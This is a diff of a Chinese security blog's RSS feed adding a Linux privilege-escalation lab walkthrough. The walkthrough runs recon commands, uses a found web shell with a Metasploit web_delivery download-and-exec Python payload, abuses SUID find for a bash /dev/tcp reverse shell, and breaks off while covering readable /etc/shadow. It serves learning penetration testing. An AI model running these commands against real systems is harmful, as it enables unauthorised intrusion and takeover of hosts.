@@ -5,8 +5,169 @@
         <link>http://gyzero.shop</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Thu, 09 Nov 2023 20:28:50 +0800</pubDate>
-        <lastBuildDate>Thu, 09 Nov 2023 20:28:50 +0800</lastBuildDate>
+        <pubDate>Fri, 10 Nov 2023 17:52:23 +0800</pubDate>
+        <lastBuildDate>Fri, 10 Nov 2023 17:52:23 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</guid>
+            <title>linux提权</title>
+            <link>http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</link>
+            <pubDate>Fri, 10 Nov 2023 17:52:23 +0800</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;信息收集命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集命令&#34;&gt;#&lt;/a&gt; 信息收集命令&lt;/h3&gt;
+&lt;h4 id=&#34;系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统信息&#34;&gt;#&lt;/a&gt; 系统信息&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;uname -a&lt;/code&gt; &lt;/strong&gt;: 显示内核、操作系统和 CPU 信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;head -n 1 /etc/issue&lt;/code&gt; &lt;/strong&gt;: 显示操作系统版本。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;cat /proc/version&lt;/code&gt; &lt;/strong&gt;: 显示系统信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;hostname&lt;/code&gt; &lt;/strong&gt;: 显示计算机名。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;env&lt;/code&gt; &lt;/strong&gt;: 显示环境变量。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;网络信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络信息&#34;&gt;#&lt;/a&gt; 网络信息&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;ifconfig&lt;/code&gt; &lt;/strong&gt;: 显示网络接口信息（现在更常用的是 &lt;code&gt;ip addr show&lt;/code&gt; ）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -lntp&lt;/code&gt; &lt;/strong&gt;: 显示所有监听端口。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -antp&lt;/code&gt; &lt;/strong&gt;: 显示所有已建立的连接。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -s&lt;/code&gt; &lt;/strong&gt;: 显示网络统计信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;iptables -L&lt;/code&gt; &lt;/strong&gt;: 显示防火墙设置。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;route -n&lt;/code&gt; &lt;/strong&gt;: 显示路由表。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;用户组信息系统服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户组信息系统服务&#34;&gt;#&lt;/a&gt; 用户组信息系统服务&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;w&lt;/code&gt; &lt;/strong&gt;：显示活动用户和他们正在使用的终端等信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;id [username]&lt;/code&gt; &lt;/strong&gt;：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;last&lt;/code&gt; &lt;/strong&gt;：显示用户登录的历史记录，包括登录时间和来源。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/passwd&lt;/code&gt; &lt;/strong&gt;：显示系统上所有用户的用户名。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/group&lt;/code&gt; &lt;/strong&gt;：显示系统上所有组的组名。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;crontab -l&lt;/code&gt; &lt;/strong&gt;：显示当前用户的计划任务（定时任务）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list&lt;/code&gt; &lt;/strong&gt;：列出所有系统服务。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list | grep on&lt;/code&gt; &lt;/strong&gt;：列出所有已启动的系统服务。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;echo $PATH&lt;/code&gt; &lt;/strong&gt;：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;nmap -sT 192.168.244.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问 80 没啥东西扫一下目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png&#34; alt=&#34;image-20231121190852090&#34;&gt;&lt;/p&gt;
+&lt;p&gt;扫到一个 shell.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png&#34; alt=&#34;image-20231121191144694&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h4&gt;
+&lt;p&gt;参数是 cmd 可以执行命令&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png&#34; alt=&#34;image-20231121191211218&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png&#34; alt=&#34;image-20231121191300474&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msf script/web_delivery模块 反弹shell&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;use exploit/multi/script/web_delivery &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set lhost 192.168.244.128&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set lport 9000&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png&#34; alt=&#34;image-20231121191557311&#34;&gt;&lt;/p&gt;
+&lt;p&gt;复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__(&#39;urllib&#39;%2B%7B2%3A&#39;&#39;%2C3%3A&#39;.request&#39;%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D(&#39;urlopen&#39;%2C))%3Br%3Du.urlopen(&#39;http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM&#39;%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png&#34; alt=&#34;image-20231121191810361&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;主机信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主机信息收集&#34;&gt;#&lt;/a&gt; 主机信息收集&lt;/h4&gt;
+&lt;p&gt;先拿一个交互 shell&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;**python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;**&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png&#34; alt=&#34;image-20231121192112964&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示内核、操作系统和CPU信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux osboxes &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;操作系统版本&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux Lite &lt;span class=&#34;token number&#34;&gt;4.4&lt;/span&gt; LTS \n \l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示系统信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux version &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buildd@lgw01&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;amd64&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;031&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gcc version &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ubuntu &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;16ubuntu3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;环境变量&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOG_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;log&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LANG&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;INVOCATION_ID&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;15ecc432bc2940368927675d4ac3a3a3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOCK_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;lock&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PWD&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;html&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;JOURNAL_STREAM&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21980&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_GROUP&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_USER&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_PID_FILE&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SHLVL&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PATH&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;_&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;计算机名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;osboxes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;系统路径列表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;开启的服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql 开启&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vboxadd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;statd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user7&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;suid提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid提权&#34;&gt;#&lt;/a&gt; suid 提权&lt;/h4&gt;
+&lt;p&gt;SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。&lt;/p&gt;
+&lt;p&gt;在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null find / -user root -perm -4000-print2&amp;gt;/dev/null find / -user root -perm -4000-exec ls -ldb &amp;#123;&amp;#125; \;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。&lt;/p&gt;
+&lt;p&gt;常见的提权文件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;查询到有一个 find&lt;/p&gt;
+&lt;p&gt;cd /  cd /tmp 到 tmp 目录&lt;/p&gt;
+&lt;p&gt;创建一个文件&lt;/p&gt;
+&lt;p&gt;touch 1234&lt;/p&gt;
+&lt;p&gt;find 1234 -exec whoami ;&lt;/p&gt;
+&lt;p&gt;这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  &lt;code&gt;whoami&lt;/code&gt;  命令。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;find&lt;/code&gt;  命令用于查找文件和目录， &lt;code&gt;-exec&lt;/code&gt;  选项允许在找到的每一个项目上执行特定的命令， &lt;code&gt;\;&lt;/code&gt;  表示命令结束。&lt;/p&gt;
+&lt;p&gt;如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， &lt;code&gt;whoami&lt;/code&gt;  命令将被执行，显示当前执行命令的用户的用户名。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png&#34; alt=&#34;image-20240207132333459&#34;&gt;&lt;/p&gt;
+&lt;p&gt;反弹 shell&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;find /etc/passwd -exec bash -ip &amp;gt;&amp;amp; /dev/tcp/192.168.244.128/4343 0&amp;gt;&amp;amp;1 \;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;nc 开启监听接收到会话&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png&#34; alt=&#34;image-20240207132540518&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;可读shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可读shadow文件利用&#34;&gt;#&lt;/a&gt; 可读 shadow 文件利用&lt;/h4&gt;
+&lt;p&gt;Shadow 文件的概述:&lt;/p&gt;
+&lt;p&gt;Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。&lt;/p&gt;
+&lt;p&gt;Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。&lt;/p&gt;
+&lt;p&gt;shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png&#34; alt=&#34;image-20240221212919749&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用&lt;/p&gt;
+&lt;p&gt;文件格式：&lt;/p&gt;
